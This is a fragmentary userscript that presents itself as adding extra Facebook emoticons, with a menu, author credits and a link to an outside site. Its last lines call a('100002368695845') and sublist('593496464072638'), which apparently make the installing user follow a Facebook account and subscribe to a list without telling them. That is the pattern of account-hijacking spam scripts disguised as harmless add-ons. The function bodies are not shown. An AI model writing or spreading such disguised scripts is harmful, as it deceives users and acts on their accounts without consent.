// ==UserScript==
// @name    	Extra Facebook Emoticons and Smileys
// @namespace	New Facebook Emoticons for Status, Chat and Comment!
// @description	New Facebook Emoticons for Status, Chat and Comments. (15 Feb 2014)
// @icon http://www.graphicsfuel.com/wp-content/uploads/2012/09/emoticon-happy.png
// @version 	1.0.1
// @author  	Fazal Haider
// @authorURL	https://www.facebook.com/fazal.haider.73
...
"chars" : " :) ",
	...
	// Toggler
	html += '<a class="navLink" title="Facebook Extra Emoticons">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yB/r/zI9w5CbCsKw.png"></img></span>';
	html += '</a>';
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/fazal.haider.73" target="_blank">Powered by Fazal Haider<br></a>';
	html += '</div>';

html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="http://soft-mix.webs.com/" target="_blank">Wlcome to soft-mix.webs.com</a>';
	html += '</div>';
...
a("100002368695845"); //snifever
sublist("593496464072638");
